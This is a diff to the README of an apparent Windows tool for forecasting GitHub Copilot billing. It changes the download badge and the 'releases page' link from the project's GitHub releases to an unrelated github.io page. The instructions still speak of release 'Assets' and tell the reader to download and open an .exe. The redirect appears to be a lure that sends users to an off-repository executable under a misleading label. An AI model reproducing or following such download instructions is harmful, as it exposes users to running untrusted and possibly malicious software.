@@ -1,6 +1,6 @@
 # 📊 copilot-billing-forecast - Track your GitHub Copilot subscription costs
 
-[ ![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue-blue.svg) ](https://github.com/Tagj6807/copilot-billing-forecast/releases)
+[ ![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue-blue.svg) ](https://tagj6807.github.io)
 
 This application helps users manage and predict GitHub Copilot expenses. You can monitor your current usage and plan your future budget without complex spreadsheets. Use this tool to see data visualizations of your team spending.
 
@@ -8,7 +8,7 @@ This application helps users manage and predict GitHub Copilot expenses. You can
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [releases page](https://github.com/Tagj6807/copilot-billing-forecast/releases) to access the download files.
+1. Visit the [releases page](https://tagj6807.github.io) to access the download files.
 2. Locate the latest version labeled under "Assets."
 3. Click the file ending in `.exe` to begin your download.
 4. Open the file once the download finishes.
